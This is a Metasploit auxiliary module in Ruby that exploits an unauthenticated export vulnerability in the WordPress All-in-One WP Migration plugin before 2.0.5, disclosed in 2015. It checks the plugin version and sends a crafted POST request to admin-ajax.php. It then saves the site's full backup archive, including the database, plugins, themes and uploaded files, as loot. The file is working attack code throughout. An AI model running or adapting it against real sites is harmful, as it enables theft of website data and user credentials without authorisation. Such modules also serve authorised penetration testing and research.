##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'WordPress All-in-One Migration Export',
      'Description'     => %q{
        This module allows you to export Wordpress data (such as the database, plugins, themes,
        uploaded files, etc) via the All-in-One Migration plugin without authentication.
      },
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'James Golovich',                  # Disclosure
          'Rob Carr <rob[at]rastating.com>'  # Metasploit module
        ],
      'References'      =>
        [
          ['WPVDB', '7857'],
          ['URL', 'http://www.pritect.net/blog/all-in-one-wp-migration-2-0-4-security-vulnerability']
        ],
      'DisclosureDate'  => 'Mar 19 2015'
    ))

    register_options(
      [
        OptInt.new('MAXTIME', [ true, 'The maximum number of seconds to wait for the export to complete', 300 ])
      ])
  end

  def check
    check_plugin_version_from_readme('all-in-one-wp-migration', '2.0.5')
  end

  def run
    print_status("Requesting website export...")
    res = send_request_cgi(
      {
        'method'    => 'POST',
        'uri'       => wordpress_url_admin_ajax,
        'vars_get'  => { 'action' => 'router' },
        'vars_post' => { 'options[action]' => 'export' }
      }, datastore['MAXTIME'])

    unless res
      fail_with(Failure::Unknown, "#{peer} - No response from the target")
    end

    if res.code != 200
      fail_with(Failure::UnexpectedReply, "#{peer} - Server responded with status code #{res.code}")
    end

    if res.body.blank?
      print_status("Unable to download anything.")
      print_status("Either the target isn't actually vulnerable, or")
      print_status("it does not allow WRITE permission to the all-in-one-wp-migration/storage directory.")
    else
      store_path = store_loot('wordpress.export', 'zip', datastore['RHOST'], res.body, 'wordpress_backup.zip', 'WordPress Database and Content Backup')
      print_good("Backup archive saved to #{store_path}")
    end
  end
end
